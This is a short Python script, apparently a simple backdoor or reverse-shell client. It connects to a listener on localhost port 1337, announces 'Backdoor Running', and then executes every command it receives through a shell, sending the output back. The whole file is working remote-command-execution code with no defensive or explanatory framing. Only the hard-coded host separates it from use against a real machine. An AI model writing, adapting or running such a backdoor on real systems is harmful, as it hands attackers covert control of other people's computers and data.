import socket as so
import subprocess as sb


Host = "127.0.0.1"
Port = 1337
s = so.socket(so.AF_INET, so.SOCK_STREAM)
s.connect((Host, Port))
s.send(b"Backdoor Running")
while True:
    data = s.recv(5120)
    print(data.decode("utf-8"))
    process = sb.Popen(data.decode("utf-8"), shell=True, stdin=sb.PIPE, stdout=sb.PIPE, stderr=sb.PIPE)
    out = process.stdout.read()
    print(out.decode("cp850"))
    if len(out) == 0:
        s.send("OK".encode(encoding='cp850'))
    else:
        s.send(out)
    print(type(process.stderr.read()))
#     s.send(process.stderr.read())